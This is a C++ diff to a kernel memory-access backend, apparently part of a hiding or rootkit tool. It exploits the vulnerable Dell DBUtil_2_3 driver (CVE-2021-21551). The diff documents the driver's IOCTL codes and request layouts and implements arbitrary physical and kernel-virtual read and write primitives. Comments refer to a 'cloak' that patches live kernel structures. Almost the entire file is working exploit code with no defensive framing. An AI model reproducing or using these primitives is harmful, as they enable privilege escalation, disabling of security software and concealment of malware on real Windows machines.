@@ -1,6 +1,7 @@
 #include "r0.hpp"
 #include <windows.h>
 #include <cstring>
+#include <cstdio>
 #include <vector>
 
 namespace r0 {
@@ -8,29 +9,48 @@ namespace r0 {
 // DBUtil_2_3 (Dell BIOS flash utility driver, CVE-2021-21551).
 //
 // The IOCTL codes and request layouts below were read out of the shipped
-// driver image, not guessed. From the driver's IRP dispatch:
+// driver image by disassembling its IRP dispatch, not guessed.
 //
-//   0x9B0C1F44  read physical memory
+//   0x9B0C1F40  physical read
 //        request  { u64 header; u64 physaddr; u8 payload[]; }
 //        length   0x10 + payload_size
-//        the driver maps the physical range with MmMapIoSpace and copies it
-//        back into the caller's buffer at +0x10.
+//        the driver maps the range with MmMapIoSpace and copies it out.
 //
-//   0x9B0C1EC8  write physical memory
-//        request  { u64 header; u64 base; u32 offset; u32 pad; u8 payload[]; }
+//   0x9B0C1F44  physical write
+//        request  { u64 header; u64 physaddr; u8 payload[]; }
+//        length   0x10 + payload_size
+//        copies the payload IN to the mapped physical range.
+//
+//   0x9B0C1EC4  kernel virtual read
+//        request  { u64 header; u64 va; u64 offset; u8 payload[]; }
 //        length   0x18 + payload_size
-//        the target address is base + offset (offset is 32-bit).
 //
-// The other IOCTLs the driver exposes are port I/O (0x9B0C1EC0/1EC4/1F80..)
-// and query handlers - none of them are needed here.
+//   0x9B0C1EC8  kernel virtual write
+//        request  { u64 header; u64 va; u64 offset; u8 payload[]; }
+//        length   0x18 + payload_size
+//        the target is va + offset (offset is read as a 32-bit value).
+//
+// The kernel-virtual path runs in the caller's thread context, so kernel
+// addresses are valid there and the copy goes through the normal cached
+// mapping. The physical path uses MmMapIoSpace(..., MmNonCached), whose
+// writes bypass the cache and do NOT invalidate other cores' lines - so
+// never use it to patch a structure the kernel is actively reading.
+//
+// The request's first 8 bytes must be zero (or match the cached value from
+// the previous call), so the header stays zeroed.
+//
+// The other IOCTLs the driver exposes are port I/O (0x9B0C1EC0,
+// 0x9B0C1F80..0x9B0C1F8C) and query handlers - none are needed here.
 
 namespace {
 
-constexpr DWORD kRead  = 0x9B0C1F44;
-constexpr DWORD kWrite = 0x9B0C1EC8;
+constexpr DWORD kPhysRead  = 0x9B0C1F40;   // MmMapIoSpace + copy out
+constexpr DWORD kPhysWrite = 0x9B0C1F44;   // MmMapIoSpace + copy in
+constexpr DWORD kKernWrite = 0x9B0C1EC8;   // memmove to a kernel VA
+constexpr DWORD kKernRead  = 0x9B0C1EC4;   // memmove from a kernel VA
 
-constexpr size_t kReadHeader  = 0x10;   // header + physaddr
-constexpr size_t kWriteHeader = 0x18;   // header + base + offset + pad
+constexpr size_t kPhysHdr = 0x10;          // { u64 hdr; u64 pa }
+constexpr size_t kKernHdr = 0x18;          // { u64 hdr; u64 va; u64 off }
 
 HANDLE g_dev = INVALID_HANDLE_VALUE;
 
@@ -47,31 +67,57 @@ void close_dev() {
 
 bool do_read(uint64_t pa, void* out, size_t len) {
     if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
-
-    std::vector<uint8_t> buf(kReadHeader + len, 0);
+    std::vector<uint8_t> buf(kPhysHdr + len, 0);
     memcpy(buf.data() + 0x08, &pa, 8);
-
     DWORD got = 0;
-    if (!DeviceIoControl(g_dev, kRead, buf.data(), (DWORD)buf.size(),
+    if (!DeviceIoControl(g_dev, kPhysRead, buf.data(), (DWORD)buf.size(),
                          buf.data(), (DWORD)buf.size(), &got, nullptr))
         return false;
-    if (got < kReadHeader + len) return false;
-
-    memcpy(out, buf.data() + kReadHeader, len);
+    // `got` is not trusted: the dispatch may report the payload length, 0, or
+    // the whole request depending on the branch. The content is validated by
+    // the caller's non-zero probe, not by this count.
+    memcpy(out, buf.data() + kPhysHdr, len);
     return true;
 }
 
 bool do_write(uint64_t pa, const void* in, size_t len) {
     if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
-
-    std::vector<uint8_t> buf(kWriteHeader + len, 0);
-    memcpy(buf.data() + 0x08, &pa, 8);          // base
-    const uint32_t off = 0;
-    memcpy(buf.data() + 0x10, &off, 4);         // offset
-    memcpy(buf.data() + kWriteHeader, in, len); // payload
-
+    std::vector<uint8_t> buf(kPhysHdr + len, 0);
+    memcpy(buf.data() + 0x08, &pa, 8);
+    memcpy(buf.data() + kPhysHdr, in, len);
     DWORD got = 0;
-    return DeviceIoControl(g_dev, kWrite, buf.data(), (DWORD)buf.size(),
+    return DeviceIoControl(g_dev, kPhysWrite, buf.data(), (DWORD)buf.size(),
+                            buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
+}
+
+bool do_vread(uint64_t va, void* out, size_t len) {
+    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
+    std::vector<uint8_t> buf(kKernHdr + len, 0);
+    memcpy(buf.data() + 0x08, &va, 8);
+    const uint64_t off = 0;
+    memcpy(buf.data() + 0x10, &off, 8);
+    DWORD got = 0;
+    if (!DeviceIoControl(g_dev, kKernRead, buf.data(), (DWORD)buf.size(),
+                         buf.data(), (DWORD)buf.size(), &got, nullptr))
+        return false;
+    memcpy(out, buf.data() + kKernHdr, len);
+    return true;
+}
+
+bool do_vwrite(uint64_t va, const void* in, size_t len) {
+    if (g_dev == INVALID_HANDLE_VALUE || !len) return false;
+    // Only canonical kernel addresses. If the IOCTL table were ever transposed
+    // again, the physical handler would treat this value as a physical address
+    // and try to map it; refusing user-range values here keeps that from
+    // becoming a mapping of an arbitrary PTE-derived address.
+    if (va < 0xFFFF800000000000ull) return false;
+    std::vector<uint8_t> buf(kKernHdr + len, 0);
+    memcpy(buf.data() + 0x08, &va, 8);
+    const uint64_t off = 0;
+    memcpy(buf.data() + 0x10, &off, 8);
+    memcpy(buf.data() + kKernHdr, in, len);
+    DWORD got = 0;
+    return DeviceIoControl(g_dev, kKernWrite, buf.data(), (DWORD)buf.size(),
                             buf.data(), (DWORD)buf.size(), &got, nullptr) != 0;
 }
 
@@ -79,23 +125,49 @@ bool do_write(uint64_t pa, const void* in, size_t len) {
 // NOTE: starts as nullptr on purpose. If it pointed at the backend table
 // from the start, init() would short-circuit on the `if (g_be)` check and
 // never open the device, reporting success with no driver present.
-Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev, do_read, do_write};
+Backend g_be_local{L"\\\\.\\DBUtil_2_3", open_dev, close_dev,
+                   do_read, do_write, do_vwrite};
 const Backend* g_be = nullptr;
 
 } // anonymous namespace
 
 bool init() {
-    // Probe: open the device and read the same physical page twice. Both
-    // reads must succeed and agree, otherwise the backend is not usable.
     if (g_be) return true;
     if (!open_dev()) return false;
 
-    uint8_t p1[8]{}, p2[8]{};
-    if (!do_read(0, p1, sizeof(p1)) || !do_read(0, p2, sizeof(p2))) {
-        close_dev();
-        return false;
+    // Prove the read path really reads.
+    //
+    // The failure this catches: if the two physical IOCTLs are transposed,
+    // every "read" is a *write* of the zero-filled request buffer, and the
+    // returned buffer stays zero. The previous version compared two such
+    // buffers, found them equal, and printed "driver ok" while zeroing RAM.
+    //
+    // So read a handful of low physical addresses that carry non-zero
+    // firmware data (BIOS data area at 0x400, its 640 KB memory-size word at
+    // 0x413) and require at least one non-zero byte. Low memory is chosen
+    // deliberately: if the table IS transposed, the only damage before we
+    // bail is a few 8-byte zeroes in reserved low RAM, not an 8-million-page
+    // CR3 scan.
+    //
+    // There is intentionally NO write probe here. A write probe would have
+    // to guess which handler is the write; guessing wrong means memmoving to
+    // a bogus kernel VA, i.e. the bugcheck we are trying to avoid. The write
+    // paths are exercised only by the cloak, which is dry-run by default.
+    static const uint64_t kProbePa[] = { 0x400, 0x410, 0x420, 0x1000, 0x2000 };
+    bool any = false;
+    for (uint64_t pa : kProbePa) {
+        uint8_t b[16]{};
+        if (!do_read(pa, b, sizeof(b))) {
+            printf("[!] physical read failed at 0x%llx (IOCTL 0x%08X)\n",
+                   (unsigned long long)pa, (unsigned)kPhysRead);
+            close_dev();
+            return false;
+        }
+        for (uint8_t v : b) any |= (v != 0);
+        if (any) break;
     }
-    if (memcmp(p1, p2, sizeof(p1)) != 0) {
+    if (!any) {
+        printf("[!] physical reads returned all zeros - IOCTL pair swapped?\n");
         close_dev();
         return false;
     }
@@ -120,6 +192,11 @@ bool pread(uint64_t pa, void* buf, size_t len) {
 bool pwrite(uint64_t pa, const void* buf, size_t len) {
     if (!g_be) return false;
     return g_be->write(pa, buf, len);
+}
+
+bool vwrite(uint64_t va, const void* buf, size_t len) {
+    if (!g_be) return false;
+    return g_be->vwrite(va, buf, len);
 }
 
 } // namespace r0
